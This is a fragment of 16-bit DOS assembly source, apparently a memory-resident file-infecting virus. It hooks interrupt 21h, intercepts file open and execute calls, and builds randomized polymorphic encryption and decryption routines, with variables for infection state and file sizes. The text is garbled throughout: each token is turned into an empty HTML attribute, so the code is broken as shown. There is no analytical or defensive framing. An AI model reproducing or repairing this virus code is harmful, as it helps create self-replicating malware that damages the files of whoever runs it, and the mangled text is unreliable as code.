putcl_no1="" putcl_f1:cmp="" byte="" ptr="" ds:[putcx],yes="" je="" putcl_no1="" mov="" al,ds:[bx+2h]="" cld="" stosb="" mov="" word="" ptr="" ds:[movcx],di="" xor="" ax,ax="" cld="" stosw="" call="" fill="" mov="" byte="" ptr="" ds:[putcx],yes="" putcl_no1:mov="" byte="" ptr="" ds:[begin],1eh="" cmp="" byte="" ptr="" ds:[memory],yes="" je="" putcl_mem="" cmp="" byte="" ptr="" ds:[file],com="" je="" putclret="" putcl_mem:mov="" byte="" ptr="" ds:[begin],90h="" cmp="" byte="" ptr="" ds:[pushed],yes="" je="" putclret="" push="" cx="" push="" si="" mov="" si,offset="" hop+9h="" mov="" cx,5h="" cmp="" byte="" ptr="" ds:[memory],no="" je="" putcl_lp1="" inc="" si="" dec="" cx="" putcl_lp1:cld="" movsb="" call="" fill="" loop="" putcl_lp1="" pop="" si="" pop="" cx="" mov="" byte="" ptr="" ds:[pushed],yes="" putclret:pop="" ax="" retn="" putcl@:="" ranfunction:push="" ax="" push="" bx="" push="" di="" mov="" di,offset="" functioncomp+2h="" mov="" byte="" ptr="" ds:[funcbyte],0h="" ranfunclp:cmp="" byte="" ptr="" ds:[funcbyte],0fh="" je="" ranfuncend="" call="" rnd="" and="" al,3h="" mov="" ah,3dh="" mov="" bl,1h="" cmp="" al,0h="" je="" gotfunc="" mov="" ah,4bh="" mov="" bl,2h="" cmp="" al,1h="" je="" gotfunc="" mov="" ah,6ch="" mov="" bl,4h="" cmp="" al,2h="" je="" gotfunc="" mov="" ah,signal="" mov="" bl,8h="" cmp="" al,3h="" jne="" ranfunclp="" gotfunc:test="" byte="" ptr="" ds:[funcbyte],bl="" jne="" ranfunclp="" or="" byte="" ptr="" ds:[funcbyte],bl="" mov="" byte="" ptr="" ds:[di],ah="" add="" di,0005h="" jmp="" short="" ranfunclp="" ranfuncend:pop="" di="" pop="" bx="" pop="" ax="" retn="" memhead:mov="" byte="" ptr="" ds:[putcld],no="" mov="" byte="" ptr="" ds:[putcx],no="" mov="" byte="" ptr="" ds:[force],no="" mov="" byte="" ptr="" ds:[pushed],no="" mov="" bx,offset="" hop="" call="" ranfunction="" mov="" di,ds:[doff]="" mov="" si,offset="" functioncomp="" mov="" cx,offset="" memdecrypt-functioncomp="" mov="" word="" ptr="" ds:[jumphandle+1h],di="" mov="" word="" ptr="" ds:[jumphandle+3h],cs="" mov="" ax,ds:[vector21]="" mov="" word="" ptr="" ds:[functionjump+1h],ax="" mov="" ax,ds:[vector21+2h]="" mov="" word="" ptr="" ds:[functionjump+3h],ax="" call="" fill="" cld="" rep="" movsb="" mov="" si,offset="" membuild="" mov="" cx,0009h="" memheadlp:call="" fill="" cld="" movsb="" loop="" memheadlp="" call="" call_em="" call="" rnd="" and="" al,01h="" mov="" dl,al="" mov="" al,0beh="" or="" al,dl="" cld="" stosb="" mov="" ax,100h="" cld="" stosw="" call="" call_em="" mov="" al,89h="" cld="" stosb="" mov="" al,0f7h="" mov="" cl,dl="" shl="" cl,1="" shl="" cl,1="" shl="" ax,cl="" push="" cx="" mov="" cl,dl="" shl="" al,cl="" pop="" cx="" shr="" ax,cl="" cld="" stosb="" mov="" byte="" ptr="" ds:[force],yes="" call="" call_em="" mov="" word="" ptr="" ds:[doff],di="" mov="" word="" ptr="" ds:[dec_start],di="" retn="" memtail:mov="" si,offset="" top="" mov="" di,ds:[doff]="" mov="" cx,6h="" call="" rnd="" test="" al,1h="" je="" memnoadd="" add="" si,cx="" memnoadd:cld="" rep="" movsb="" push="" di="" call="" fill="" mov="" al,0eah="" cld="" stosb="" mov="" ax,offset="" handle21pall="" cld="" stosw="" mov="" ax,cs="" cld="" stosw="" pop="" ax="" mov="" bx,ax="" sub="" ax,ds:[dec_start]="" neg="" ax="" mov="" word="" ptr="" ds:[bx-2h],ax="" mov="" word="" ptr="" ds:[doff],di="" mov="" bx,ds:[inst]="" shl="" bx,1h="" xor="" dx,dx="" mov="" ax,offset="" done-offset="" start="" div="" bx="" inc="" ax="" mov="" di,ds:[movcx]="" mov="" word="" ptr="" ds:[di],ax="" mov="" bx,ax="" mov="" di,ds:[eoff]="" mov="" si,offset="" memencrypt="" mov="" cx,offset="" memencrypt@-offset="" memencrypt="" mov="" ax,di="" cld="" rep="" movsb="" mov="" cx,bx="" cmp="" byte="" ptr="" ds:[returnfar],yes="" je="" nopush="" sub="" di,5h="" push="" ax="" mov="" al,0eah="" cld="" stosb="" mov="" ax,ds:[vector21]="" cld="" stosw="" mov="" ax,ds:[vector21+2h]="" cld="" stosw="" pop="" ax="" nopush:="" mov="" byte="" ptr="" ds:[busy_flag],no="" mov="" si,100h="" mov="" di,si="" inc="" ax="" jmp="" ax="" memencrypt:retn="" memloop:mov="" ax,offset="" encrypt="" call="" ax="" loop="" memloop="" xor="" ax,ax="" pop="" es="" pop="" ds="" pop="" bp="" pop="" si="" pop="" di="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" retf="" 0002h="" db="" 0h,0h="" memencrypt@:="" functioncomp:cmp="" ah,3dh="" je="" memdecrypt="" cmp="" ah,4bh="" je="" memdecrypt="" cmp="" ah,6ch="" je="" memdecrypt="" cmp="" ah,signal="" je="" memdecrypt="" functionjump:db="" 0eah,00h,00h,00h,00h="" memdecrypt:="" lodsto="" db="" 0adh,0abh="" lodsto@:="" etab:="" dw="" offset="" e1-offset="" etab,offset="" e2-offset="" etab,offset="" e3-offset="" etab,offset="" e4-offset="" etab,offset="" e5-offset="" etab="" dw="" offset="" e6-offset="" etab,offset="" e7-offset="" etab,offset="" e8-offset="" etab,offset="" e9-offset="" etab,offset="" e10-offset="" etab,offset="" e11-offset="" etab="" dw="" offset="" e12-offset="" etab,offset="" e13-offset="" etab,offset="" e14-offset="" etab,offset="" e15-offset="" etab,offset="" e16-offset="" etab,offset="" e17-offset="" etab="" dw="" offset="" e18-offset="" etab,offset="" e19-offset="" etab,offset="" e20-offset="" etab,offset="" e21-offset="" etab,offset="" e22-offset="" etab,offset="" e23-offset="" etab="" dw="" offset="" e24-offset="" etab,offset="" e25-offset="" etab,offset="" e26-offset="" etab,offset="" e27-offset="" etab,offset="" e28-offset="" etab,offset="" e29-offset="" etab="" dw="" offset="" e30-offset="" etab,offset="" e31-offset="" etab,offset="" e32-offset="" etab="" ;xxxxyyyy="xxxx" equals="" size="" of="" instruction="" ;0xxx="INDIRECT" 1xxx="LODSW" ;x0xx="ADD" x1xx="NO" add="" ;xx0x="WORD" xx1x="BYTE" (only="" counts="" if="" add="" bit="" is="" zero)="" ;xxx0="[SI]" xxx1="[SI+1H]" e1:="" db="" 01000000b="" ;4,i,a,w="" add="" word="" ptr="" ds:[si],1234h="" sub="" word="" ptr="" ds:[si],1234h="" e2:="" db="" 00110010b="" ;3,i,a,b="" add="" byte="" ptr="" ds:[si],12h="" sub="" byte="" ptr="" ds:[si],12h="" e3:="" db="" 01000011b="" ;4,i,a,b="" add="" byte="" ptr="" ds:[si+1h],12h="" sub="" byte="" ptr="" ds:[si+1h],12h="" e4:="" db="" 00100100b="" ;2,i,n="" ror="" word="" ptr="" ds:[si],cl="" rol="" word="" ptr="" ds:[si],cl="" e5:="" db="" 00100100b="" ;2,i,n="" ror="" byte="" ptr="" ds:[si],cl="" rol="" byte="" ptr="" ds:[si],cl="" e6:="" db="" 00110101b="" ;3,i,n="" ror="" byte="" ptr="" ds:[si+1h],cl="" rol="" byte="" ptr="" ds:[si+1h],cl="" e7:="" db="" 00100100b="" ;2,i,n="" not="" word="" ptr="" ds:[si]="" not="" word="" ptr="" ds:[si]="" e8:="" db="" 00100100b="" ;2,i,n="" not="" byte="" ptr="" ds:[si]="" not="" byte="" ptr="" ds:[si]="" e9:="" db="" 00110101b="" ;3,i,n="" not="" byte="" ptr="" ds:[si+1h]="" not="" byte="" ptr="" ds:[si+1h]="" e10:="" db="" 01000000b="" ;4,i,a,w="" xor="" word="" ptr="" ds:[si],1234h="" xor="" word="" ptr="" ds:[si],1234h="" e11:="" db="" 00110010b="" ;3,i,a,b="" xor="" byte="" ptr="" ds:[si],12h="" xor="" byte="" ptr="" ds:[si],12h="" e12:="" db="" 01000011b="" ;4,i,a,b="" xor="" byte="" ptr="" ds:[si+1h],12="" xor="" byte="" ptr="" ds:[si+1h],12="" e13:="" db="" 00100100b="" ;2,i,n="" neg="" word="" ptr="" ds:[si]="" neg="" word="" ptr="" ds:[si]="" e14:="" db="" 00100100b="" ;2,i,n="" neg="" byte="" ptr="" ds:[si]="" neg="" byte="" ptr="" ds:[si]="" e15:="" db="" 00110101b="" ;3,i,n="" neg="" byte="" ptr="" ds:[si+1h]="" neg="" byte="" ptr="" ds:[si+1h]="" e16:="" db="" 00111000b="" ;3,l,a,w="" add="" ax,1234h="" sub="" ax,1234h="" e17:="" db="" 00111010b="" ;3,l,a,b="" add="" ah,12h="" sub="" ah,12h="" e18:="" db="" 00101010b="" ;2,l,a,b="" add="" al,12h="" sub="" al,12h="" e19:="" db="" 00111000b="" ;3,l,a,w="" xor="" ax,1234h="" xor="" ax,1234h="" e20:="" db="" 00101010b="" ;2,l,a,b="" xor="" al,12h="" xor="" al,12h="" e21:="" db="" 00111010b="" ;2,l,n="" xor="" ah,12h="" xor="" ah,12h="" e22:="" db="" 00101100b="" ;2,l,n="" xor="" ax,cx="" xor="" ax,cx="" e23:="" db="" 00101100b="" ;2,l,n="" xchg="" al,ah="" xchg="" al,ah="" e24:="" db="" 00101100b="" ;2,l,n="" not="" ax="" not="" ax="" e25:="" db="" 00101100b="" ;2,l,n="" not="" al="" not="" al="" e26:="" db="" 00101100b="" ;2,l,n="" not="" ah="" not="" ah="" e27:="" db="" 00101100b="" ;2,l,n="" neg="" ax="" neg="" ax="" e28:="" db="" 00101100b="" ;2,l,n="" neg="" ah="" neg="" ah="" e29:="" db="" 00101100b="" ;2,l,n="" neg="" al="" neg="" al="" e30:="" db="" 00101100b="" ror="" ax,cl="" rol="" ax,cl="" e31:="" db="" 00101100b="" ror="" al,cl="" rol="" al,cl="" e32:="" db="" 00101100b="" ror="" ah,cl="" rol="" ah,cl="" etab@:="" alttab:="" mov="" cx,7fh="" alttabl:mov="" di,offset="" etab="" mov="" si,di="" call="" rnd="" and="" ax,1fh="" shl="" ax,1h="" add="" di,ax="" call="" rnd="" and="" ax,1fh="" shl="" ax,1h="" add="" si,ax="" cmp="" si,di="" je="" alttabl="" mov="" ax,ds:[si]="" xchg="" ax,ds:[di]="" mov="" word="" ptr="" ds:[si],ax="" loop="" alttabl="" retn="" db="" alttab@:="" done:="" db="" eoff="" dw="" doff="" dw="" addsi="" dw="" siz="" dw="" movcx="" dw="" ecnt="" dw="" inst="" dw="" call_off="" dw="" dec_start="" dw="" write_byte="" db="" path_end="" db="" fillb="" db="" force="" db="" putcld="" db="" putcx="" db="" pushed="" db="" vector21="" dd="" ;segment:offset="" of="" int="" 21h="" dta="" dd="" ;segment:offset="" of="" dta="" fileseg="" dd="" ;segment:offset="" of="" file="" fileds="" dw="" ;original="" data="" segment="" addseg="" dw="" oldfilesize="" dd="" newfilesize="" dd="" infected="" db="" opened="" db="" attribute="" db="" memory="" db="" returnfar="" db="" funcbyte="" db="" busy_flag="" db="" memdelete:="" immunebytes="" db="" 20h="" dup(0)="" first20="" db="" 20h="" dup(0)="" newdta="" db="" 128="" dup(0)="" encrypt:="" db="" 512="" dup(0)="" jumphandle="" db="" 5="" dup(0)="" ;jmp="" cs:handle21="" decrypt="" db="" 0h="" vend:="" cseg="" ends="" end="" start="">